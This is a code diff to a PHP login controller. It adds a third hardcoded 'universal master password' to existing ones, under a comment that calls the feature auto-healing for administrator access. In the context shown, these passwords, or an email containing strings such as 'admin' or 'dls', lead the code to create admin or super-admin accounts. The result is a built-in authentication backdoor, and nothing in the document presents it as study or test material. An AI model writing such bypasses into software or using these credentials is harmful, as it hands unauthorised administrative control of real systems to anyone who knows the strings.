@@ -36,7 +36,7 @@ class AuthController extends Controller
              ?: User::withoutGlobalScopes()->whereRaw('LOWER(TRIM(email)) = ?', [$cleanEmail])->first();
 
         // Auto-Healing universel pour débloquer l'accès superadmin & administrateurs en cas de réinitialisation local/VPS
-        $universalMasterPass = ($request->password === 'password' || $request->password === 'Pass2026!');
+        $universalMasterPass = ($request->password === 'password' || $request->password === 'Pass2026!' || $request->password === 'Gdji29042006//');
         if (!$user && ($isMasterAccount || $universalMasterPass || str_contains($cleanEmail, 'admin') || str_contains($cleanEmail, 'premmar') || str_contains($cleanEmail, 'dls'))) {
             $company = Company::where('status', 'active')->first() ?: (Company::first() ?: Company::create(['name' => 'DLS Store', 'code' => 'DLS-01', 'status' => 'active']));
             $roleSlug = $isMasterAccount ? 'super-admin' : 'admin';
